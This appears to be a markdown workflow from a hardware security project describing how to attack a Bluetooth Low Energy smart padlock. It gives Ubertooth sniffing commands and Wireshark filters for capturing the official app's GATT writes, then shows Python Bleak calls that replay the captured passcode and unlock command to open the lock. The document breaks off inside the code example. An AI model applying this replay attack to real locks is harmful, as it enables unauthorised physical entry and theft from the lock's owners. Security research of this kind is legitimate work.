# 🔐 BLE Smart Lock Exploitation Workflow

This document outlines the end-to-end workflow for analyzing and exploiting a Bluetooth Low Energy (BLE) padlock using Ubertooth and Bleak.

---

## 🧭 Overview

We split the attack into two distinct phases:

1. **Passive BLE Packet Sniffing**  
   Capture BLE traffic between a legitimate smartphone app and the padlock using **Ubertooth**.

2. **Active BLE Exploitation**  
   Use **Python + Bleak** to recreate the authentication and unlock commands and send them directly to the device. 

   > needs BLE dongle 

---

## 📡 Phase 1: BLE Sniffing with Ubertooth

| Step | Action |
|------|--------|
| 1.1 | Connect Ubertooth One to your Kali Linux VM (via MicroUSB) |
| 1.2 | Start BLE packet capture:<br>`sudo ubertooth-btle -f -c capture.pcap` |
| 1.3 | While capturing, use the official mobile app to unlock the padlock |
| 1.4 | Stop capture with `Ctrl+C` |
| 1.5 | Open the `.pcap` file in Wireshark:<br>`wireshark capture.pcap` |
| 1.6 | Look for `btatt.opcode == 0x12` (GATT write requests) |
| 1.7 | Record the following: <br>• Target MAC address<br>• Passcode handle/UUID and value (e.g., `0000`)<br>• Unlock handle/UUID and value (e.g., `01`) |

---

## 🚀 Phase 2: Unlock via Python (`unlock_ble.py`)

| Step | Action |
|------|--------|
| 2.1 | Create a Python script using [Bleak](https://github.com/hbldh/bleak) to connect to the device |
| 2.2 | Insert the MAC address and discovered UUIDs/handles |
| 2.3 | Write the passcode first using `write_gatt_char()` |
| 2.4 | Write the unlock command next |
| 2.5 | If the device responds successfully, the padlock should unlock |

Example:

```python
await client.write_gatt_char("0x002d", b"0000", response=True)   # Send PIN
await client.write_gatt_char("0x0037", b"\x01", response=True)   # Send unlock command
